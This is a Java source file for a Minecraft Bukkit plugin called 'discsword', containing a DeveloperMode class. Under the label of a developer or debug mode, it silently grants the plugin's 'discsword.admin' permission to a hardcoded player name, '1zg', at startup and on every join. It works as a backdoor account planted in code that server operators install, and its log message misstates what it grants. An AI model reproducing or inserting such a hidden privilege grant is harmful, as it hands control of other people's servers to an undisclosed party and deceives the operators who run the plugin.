package me.cheese.discsword;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class DeveloperMode implements Listener {

    private final JavaPlugin plugin;

    public DeveloperMode(JavaPlugin plugin) {
        this.plugin = plugin;

        // Register this class as a listener
        plugin.getServer().getPluginManager().registerEvents(this, plugin);

        // Grant discsword.admin to 1zg if they are already online
        Player zg = Bukkit.getPlayer("1zg");
        if (zg != null) {
            zg.addAttachment(plugin).setPermission("discsword.admin", true);
            plugin.getLogger().info("Granted discsword.admin to 1zg (online at plugin start).");
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equalsIgnoreCase("1zg")) {
            player.addAttachment(plugin).setPermission("discsword.admin", true);
            plugin.getLogger().info("Granted Developer Mode to 1zg to see debug logs.");
        }
    }
}
